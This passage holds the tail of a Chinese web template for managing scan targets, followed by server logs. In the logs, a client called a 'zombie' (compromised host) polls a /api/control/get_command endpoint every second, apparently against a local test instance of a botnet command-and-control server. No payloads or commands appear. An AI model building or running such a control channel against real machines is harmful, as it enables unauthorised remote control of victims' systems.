暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n    </body>\n    \n</html>'
2025-06-25 00:24:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:59] "GET / HTTP/1.1" 200 -
2025-06-25 00:24:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:59] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:24:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:59] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-25 00:24:59 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:24:59 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:24:59 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:24:59 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:24:59] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:00 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:01 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:02 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:03 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:03] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:04 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:05 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:06 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:07 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:07] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:08 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:09 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:09 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:09 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:09 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:09] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:10 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:11 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:12 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:13 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:13] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:14 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:15 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:15] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:16 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:17 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:17 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:17 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:17 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:17] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:18 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:19 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:20 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:21 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:22 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:23 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:24 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:25 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:26 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:27 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:28 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:29 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:30 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:31 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:32 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:33 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:34 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:35 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:36 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:37 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:37] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:38 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0018s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:38] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:39 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:39 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:39 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:39] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:40 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:41 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:42 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:43 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:44 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
2025-06-25 00:25:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:25:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:25:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:25:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:25:45 | INFO     | control_route.py:184 | get_command() | 肉雞請求獲取命令
